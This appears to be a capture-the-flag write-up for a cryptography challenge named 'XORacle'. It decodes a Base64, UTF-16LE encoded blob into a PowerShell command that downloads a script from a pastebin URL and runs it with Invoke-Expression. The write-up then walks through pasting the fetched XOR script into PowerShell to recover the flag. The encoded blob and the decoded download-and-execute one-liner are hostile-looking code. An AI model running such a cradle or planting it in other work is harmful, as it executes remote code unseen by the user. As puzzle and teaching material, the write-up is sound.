Cryptoghrapy
title: XORacle

encoded script:
SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuAC4AYwBvAG0ALwByAGEAdwAvAHIAQQA5AHoAdgBqADUAdQAiACkADQAKAA

The encoded script provided is in Base64 format. When decoded using Base64, it results in a string that appears to be encoded in UTF-16LE (Little Endian) format. To properly decode this UTF-16LE encoded string, we need to use a decoding tool or script that supports UTF-16LE decoding. We discovered that the encoded script corresponds to a PowerShell command.

Invoke-Expression (New-Object Net.WebClient).DownloadString("https://pastebin.com/raw/rA9zvj5u")

Given the presence of the command "Invoke-Expression," it indicates a strong likelihood that the script is intended for execution in a PowerShell environment. The decoded script is a PowerShell command that uses Invoke-Expression to execute the code retrieved from a URL. Specifically, it downloads and executes a script from the URL https://pastebin.com/raw/rA9zvj5u.Further analysis of the content at the provided URL is necessary to potential clues to get the flag. 

Next, Copy the provided URL (https://pastebin.com/raw/rA9zvj5u) and paste it into a web browser. This retrieves the contents of the script. 

Understand the Script: First, players should examine the provided PowerShell script. The script defines a function named xor that performs XOR encryption and decryption.

To retrieve the flag using this script, you would indeed follow these steps:

1. Copy the entire PowerShell script provided.
2. Open PowerShell on your system.
3. Paste the copied script into the PowerShell terminal and press Enter to execute it.
4. After execution, the $output2 variable will contain the decrypted output, which likely contains the flag or further instructions. 

In the provided PowerShell script, the `$output2` variable is assigned the result of calling the `xor` function with the encrypted string and specifying the decryption method as "decrypt". This means that `$output2` will contain the decrypted output after executing the script.

So, when you echo or print the value of `$output2` after executing the script in PowerShell, it will display the decrypted output, which likely contains the flag. The script is designed to perform decryption and assign the result to `$output2`, allowing you to easily access the decrypted information by echoing or printing the value of `$output2`.
 